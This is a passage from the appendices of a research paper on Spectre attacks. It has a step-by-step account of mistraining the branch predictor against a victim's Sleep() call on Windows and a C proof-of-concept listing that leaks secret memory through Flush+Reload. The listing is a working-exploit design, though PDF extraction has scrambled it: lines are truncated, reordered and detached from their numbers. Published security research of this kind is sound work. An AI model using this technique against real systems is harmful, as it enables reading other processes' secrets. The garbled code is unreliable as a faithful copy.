adjacent operations might un-evict the return address (e.g., by
accessing the stack) and limit speculative execution.
In order to get
the victim to speculatively execute the
gadget, we caused the memory location containing the jump
destination to be uncached. In addition, we mistrained the
branch predictor to send speculative execution to the gadget.
These were accomplished as follows:
• Simple pointer operations were used to locate the indirect
jump at the entry point for Sleep() and the memory
location holding the destination for the jump.
• A search of ntdll.dll in RAM was performed to ﬁnd
the gadget, and some shared DLL memory was chosen for
performing Flush+Reload detections.
• To prepare for branch predictor mistraining, the memory
page containing the destination for the jump was made
writable (via copy-on-write) and modiﬁed to change the
jump destination to the gadget address. Using the same
method, a ret 4 instruction was written at the location of
the gadget. These changes do not affect the memory seen
by the victim (which is running in a separate process), but
make it so that the attacker’s calls to Sleep() will jump
to the gadget address (mistraining the branch predictor)
then immediately return.
• A separate thread was launched to repeatedly evict the
victim’s memory address containing the jump destination.
Although the memory containing the destination has the
same virtual address for the attacker and victim, they ap-
pear to have different physical memory – perhaps because
of a prior copy-on-write. The eviction was done using the
same general method as the JavaScript example, i.e., by
allocating a large table and using a pair of indexes to read
addresses at 4096-byte multiples of the address to evict.
• Thread(s) were launched to mistrain the branch predictor.
These use a 220 byte (1MB) executable memory region
ﬁlled with 0xC3 bytes (ret instructions). The victim’s
pattern of jump destinations is mapped to addresses in
this area, with an adjustment for ASLR found during
an initial training process (see main paper). The branch
predictor mistraining threads run a loop which pushes the
mapped addresses onto the stack such that an initiating
ret instruction results in the processor performing a series
of return instructions in the memory region, then branches
to the gadget address, then (because of the ret placed
there) immediately returns back to the loop.
• To encourage hyperthreading of the mistraining thread and
the victim, the eviction and probing threads set their CPU
afﬁnity to share a core (which they keep busy), leaving
the victim and mistraining threads to share the rest of the
cores.
the victim is
• During the initial phase of getting the branch pre-
supplied
dictor mistraining working,
with input
that, when the victim calls Sleep(),
[ebx+3h+13BE13BDh] will read a DLL location whose
value is known and edi is chosen such that the second op-
eration will point to another location that can be monitored
easily. With these settings, the branch training sequence is
adjusted to compensate for the victim’s ASLR.
• As described in the main paper, a separate gadget was used
to ﬁnd the victim’s stack pointer.
• Finally, the attacker can read through the victim’s address
space to locate and read victim data regions to locate values
(which can move due to ASLR) by controlling the values
of ebx and edi and using Flush+Reload on the DLL
region selected above.
The completed attack allows the reading of memory from
the victim process.
APPENDIX C
SPECTRE EXAMPLE IMPLEMENTATION
5,
if
the
In
Listing
compiled
instructions
in
victim_function() were executed in strict program
order, the function would only read from array1[0..15]
since array1_size = 16. Yet, when executed speculatively,
out-of-bounds reads occur and leak the secret string.
The read_memory_byte() function makes
several
training calls to victim_function() to make the branch
predictor expect valid values for x,
then calls with an
out-of-bounds x. The conditional branch mispredicts and
the ensuing speculative execution reads a secret byte us-
ing the out-of-bounds x. The speculative code then reads
from array2[array1[x] * 4096], leaking the value of
array1[x] into the cache state.
To complete the attack, the code uses a simple Flush+Reload
sequence to identify which cache line in array2 was loaded,
revealing the memory contents. The attack is repeated several
times, so even if the target byte was initially uncached, the
ﬁrst iteration will bring it into the cache. This unoptimized
implementation can read around 10 KB/s on an i7-4650U.
(cid:18)(cid:24)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:46:03 UTC from IEEE Xplore.  Restrictions apply. 
if (x 
2 #include 
3 #include 
4 #ifdef _MSC_VER
5 #include  /* for rdtscp and clflush */
6 #pragma optimize("gt", on)
7 #else
8 #include  /* for rdtscp and clflush */
9 #endif
10
11 /********************************************************************
12 Victim code.
13 ********************************************************************/
14 unsigned int array1_size = 16;
15 uint8_t unused1[64];
16 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
17 uint8_t unused2[64];
18 uint8_t array2[256 * 512];
19
20 char *secret = "The Magic Words are Squeamish Ossifrage.";
21
22 uint8_t temp = 0; /* To not optimize out victim_function() */
23
24 void victim_function(size_t x) {
25
26
27
28 }
29
30 /********************************************************************
31 Analysis code
32 ********************************************************************/
33 #define CACHE_HIT_THRESHOLD (80) /* cache hit if time > 16));
x = training_x ˆ (x & (malicious_x ˆ training_x));
/* 5 trainings (x=training_x) per attack run (x=malicious_x) */
training_x = tries % array1_size;
for (j = 29; j >= 0; j--) {
static int results[256];
int tries, i, j, k, mix_i, junk = 0;
size_t training_x, x;
register uint64_t time1, time2;
volatile uint8_t *addr;
/* Flush array2[256*(0..255)] from cache */
for (i = 0; i  0; tries--) {
(cid:18)(cid:25)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:46:03 UTC from IEEE Xplore.  Restrictions apply. 
/* Time reads. Mixed-up order to prevent stride prediction */
for (i = 0; i  score +1 for this value */
/* Locate highest & second-highest results */
j = k = -1;
for (i = 0; i = results[j]) {
} else if (k = results[k]) {
}
}
if (results[j] >= (2 * results[k] + 5) ||
(results[j] == 2 && results[k] == 0))
break; /* Success if best is > 2*runner-up + 5 or 2/0) */
}
/* use junk to prevent code from being optimized out */
results[0] ˆ= junk;
value[0] = (uint8_t)j;
score[0] = results[j];
value[1] = (uint8_t)k;
score[1] = results[k];
}
}
k = j;
j = i;
k = i;
/* Call the victim! */
victim_function(x);
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103 }
104
105 int main(int argc, const char **argv) {
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131 }
printf("Reading %d bytes:\n", len);
while (--len >= 0) {
int i, score[2], len = 40;
uint8_t value[2];
for (i = 0; i  0)
if (argc == 3) {
printf("\n");
}
(size_t)(secret - (char *)array1); /* default for malicious_x */
array2[i] = 1; /* write to array2 to ensure it is memory backed */
sscanf(argv[1], "%p", (void **)(&malicious_x));
malicious_x -= (size_t)array1; /* Input value to pointer */
sscanf(argv[2], "%d", &len);
printf("Reading at malicious_x = %p... ", (void *)malicious_x);
readMemoryByte(malicious_x++, value, score);
printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
printf("0x%02X=’%c’ score=%d
", value[0],
(value[0] > 31 && value[0] < 127 ? value[0] : ’?’), score[0]);
printf("(second best: 0x%02X score=%d)", value[1], score[1]);
Listing 5: A demonstration reading memory using a Spectre attack on x86.
(cid:18)(cid:26)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:46:03 UTC from IEEE Xplore.  Restrictions apply.